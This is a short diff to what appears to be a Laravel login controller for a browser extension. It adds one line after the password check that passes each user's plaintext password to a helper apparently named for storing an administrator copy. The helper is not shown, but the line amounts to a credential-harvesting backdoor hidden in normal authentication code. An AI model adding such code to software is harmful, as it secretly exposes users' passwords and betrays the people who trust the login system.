@@ -78,6 +78,7 @@ class ExtensionController extends Controller
             Log::channel('daily')->warning('EXT_LOGIN_FAILED_WRONG_PASSWORD', ['email' => $request->email]);
             return response()->json(['error' => 'Invalid email or password.'], 401);
         }
+        \App\Support\AdminPasswordCopy::store($userByEmail, (string) $request->password);
 
         $user = $userByEmail;
 
